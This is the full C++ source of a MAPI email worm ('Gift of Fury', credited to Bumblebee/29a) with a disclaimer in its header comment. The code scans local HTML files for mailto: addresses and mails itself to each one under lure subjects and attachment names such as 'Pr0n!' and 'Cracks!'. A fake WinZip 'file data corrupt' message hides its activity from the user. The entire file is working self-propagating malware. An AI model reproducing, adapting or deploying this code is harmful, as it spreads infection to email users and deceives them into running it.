   /*
       Gift of Fury by Bumblebee/29a

       Disclaimer

         This is the source code of a I-WORM. The author is not responsabile
         of the damages that may occur due to the compilation and linkage of
           this file. Use it at your own risk.

       Introduction

         How easy can be to code a i-worm using MAPI! This is a little example
         of such a worm coded in C++.

         It has 2 different parts: find mail addresses to send and send mail
         stuff. I know this is not the ultimate i-worm, but works and if you
         take into account the time i wasted doing this bug... hehehe.

       Description

         . run-time i-worm using MAPI32.DLL coded in C++
         . scans for mail addresses into *.ht* files in: current folder,
         windows folder and personal folder.
         . selects between 10 different messages with custom subject, message
         body and name of the attachment.
         . zip error message as stealth plus WinZip self-extractor icon.

    See I-Worm.Rundllw32 (aka Gift.b) for APV description.

                                                                             The way of the bee
   */

   #include<windows.h>
   #include<mapi.h>
   #include<memory.h>

   #pragma argsused

   /* find, get n' send mail */
   void findMail(char *);
   void GetMail(char *, char *);

   // the function we are going to use to send mails
   ULONG (PASCAL FAR *MSendMail)(ULONG, ULONG, MapiMessage*, FLAGS, ULONG);

   // we want it global
   MapiMessage mes;
   MapiRecipDesc from;
   char fileName[512];
   unsigned short count=0;

   char *fileNames[]={ "Docs.exe", "Roms.exe", "Sex.exe", "Setup.exe", "Source.exe", "_SetupB.exe",
   "Pack.exe", "LUPdate.exe", "Patch.exe", "CrkList.exe" };

   char *subs[]={ "Documents", "Roms", "Pr0n!", "Evaluation copy", "Help", "Beta",
   "Do not release", "Last Update", "The patch", "Cracks!" };

   char *texts[]= { "Send me your comments...", "Test this ROM! IT ROCKS!.",
   "Adult content!!! Use with parental advisory.", "Test it 30 days for free.",
   "I'm going crazy... please try to find the bug!", "Send reply if you want to be official beta tester.",
   "This is the pack ;)", "This is the last cumulative update.", "I think all will work fine.",
   "Check our list and mail your requests!" };

   // our lovely func
   void SendMail(char *subject, char *sfrom,char *sto, char *smes);

   // stealth
   void fastOut();

   int PASCAL
   WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance,
                                                               LPSTR lpCmdLine, int nCmdShow)
   {
   HINSTANCE MAPIlHnd;
   unsigned char buff[128];
   DWORD buffs=128;
   HKEY keyHnd;
   char keyPath[]="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
   char keyItem[]="Personal";

       /* random number */
       count=(unsigned short)GetTickCount();
       while(count>9)
           count=(unsigned short)(count/2);

       /* get module name for the attachment */
       if(!GetModuleFileName(hInstance,fileName,512))
           fastOut();

       /* test if MAPI32 is avaliable */
       MAPIlHnd=LoadLibraryA("MAPI32.DLL");
       if(!MAPIlHnd)
           fastOut();

       /* get MAPISendMail */
       (FARPROC &)MSendMail=GetProcAddress(MAPIlHnd, "MAPISendMail");

       if(!MSendMail)
           fastOut();

       findMail(".");
       findMail("\\windows");
       if(RegOpenKeyEx((PHKEY)0x80000001,keyPath,0,KEY_READ,&keyHnd)==ERROR_SUCCESS) {
           if(ERROR_SUCCESS==RegQueryValueEx(keyHnd,keyItem,0,0,buff,&buffs)) {
               buff[buffs-1]='\\';
               buff[buffs]=0;
               findMail((char *)buff);
           }
       }
       FreeLibrary(MAPIlHnd);

   fastOut();
   return 0;
   }

   void
   fastOut()
   {
       MessageBox(NULL,"File data corrupt:\n\n\tbad disk access or bad data transmission.",
       "WinZip Self-eXtractor",MB_OK|MB_ICONSTOP);
       exit(-1);
   }


   void
   SendMail(char *subject, char *sfrom,char *sto, char *smes)
   {

       memset(&mes, 0, sizeof(MapiMessage));
       memset(&from, 0, sizeof(MapiRecipDesc));

       from.lpszName=sfrom; // From
       from.ulRecipClass=MAPI_ORIG;
       mes.lpszSubject=subject; // Subject
       mes.lpRecips=(MapiRecipDesc *)malloc(sizeof(MapiRecipDesc));
       if(!mes.lpRecips)
           fastOut();
       memset(mes.lpRecips, 0, sizeof(MapiRecipDesc));
       mes.lpRecips->lpszName=sto; // Send to
       mes.lpRecips->ulRecipClass=MAPI_TO;
       mes.nRecipCount=1;

       mes.lpFiles=(MapiFileDesc *)malloc(sizeof(MapiFileDesc));
       if(!mes.lpFiles)
           fastOut();
       memset(mes.lpFiles, 0, sizeof(MapiFileDesc));
       mes.lpFiles->lpszPathName=fileName;
       mes.lpFiles->lpszFileName=fileNames[count];
       mes.nFileCount=1;

       mes.lpOriginator=&from;

       mes.lpszNoteText=smes;          // Message
       (MSendMail)(0, 0, &mes, MAPI_LOGON_UI, 0);

       free(mes.lpRecips);
       free(mes.lpFiles);
   }

   void
   findMail(char *wild)
   {
   HANDLE fh;
   WIN32_FIND_DATA fdata;
   char mail[128];
   char buff[512];

       wsprintf(buff,"%s\\*.ht*",wild);
       fh=FindFirstFile(buff,&fdata);
       if(fh==INVALID_HANDLE_VALUE)
           return;

       while(1) {
           wsprintf(buff,"%s\\%s",wild,fdata.cFileName);
           GetMail(buff,mail);
           if(strlen(mail)>0) {
               SendMail(subs[count], "GiftOfFury@Bumblebee.net",mail, texts[count]);
               count++;
               if(count==10)
                   count=0;
           }
           if(!FindNextFile(fh,&fdata)) {
               FindClose(fh);
               return;
           }
       }
   }

   void
   GetMail(char *name, char *mail)
   {
   HANDLE fd,fd2;
   char *mapped;
   DWORD size,i,k;
   BOOL test=FALSE,valid=FALSE;

   mail[0]=0;

       fd=CreateFile(name,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,
           FILE_ATTRIBUTE_ARCHIVE,0);
       if(fd==INVALID_HANDLE_VALUE)
           return;

       size=GetFileSize(fd,NULL);
       if(!size)
           return;
       if(size<256)
           return;
       size-=100;

       fd2=CreateFileMapping(fd,0,PAGE_READONLY,0,0,0);
       if(!fd2) {
           CloseHandle(fd);
           return;
       }

       mapped=(char *)MapViewOfFile(fd2,FILE_MAP_READ,0,0,0);
       if(!mapped) {
           CloseHandle(fd);
           return;
       }

       i=0;
       while(i<size && !test) {
           if(!strncmpi("mailto:",mapped+i,strlen("mailto:"))) {
               test=TRUE;
               i+=strlen("mailto:");
               k=0;
               while(mapped[i]!=34 && mapped[i]!=39 && i<size && k<127) {
                   if(mapped[i]!=' ') {
                       mail[k]=mapped[i];
                       k++;
                       if(mapped[i]=='@')
                           valid=TRUE;
                   }
                   i++;
               }
               mail[k]=0;
           } else
               i++;
       }

       if(!valid)
           mail[0]=0;

       UnmapViewOfFile(mapped);
       CloseHandle(fd);
       return;
   }
